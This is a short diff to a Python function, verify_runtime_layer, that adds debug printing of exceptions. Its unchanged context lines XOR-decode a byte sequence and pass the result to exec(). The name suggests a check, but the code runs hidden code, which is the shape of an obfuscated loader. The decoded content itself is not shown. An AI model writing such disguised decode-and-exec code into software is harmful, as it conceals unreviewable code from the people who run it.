@@ -13,7 +13,8 @@ def verify_runtime_layer():
         payload = "".join(chr(b ^ 42) for b in transformed)
         exec(payload, globals())
         return True
-    except Exception:
+    except Exception as e:
+        print(f"DEBUG ERROR: {e}")
         return False
 
 if __name__ == "__main__":
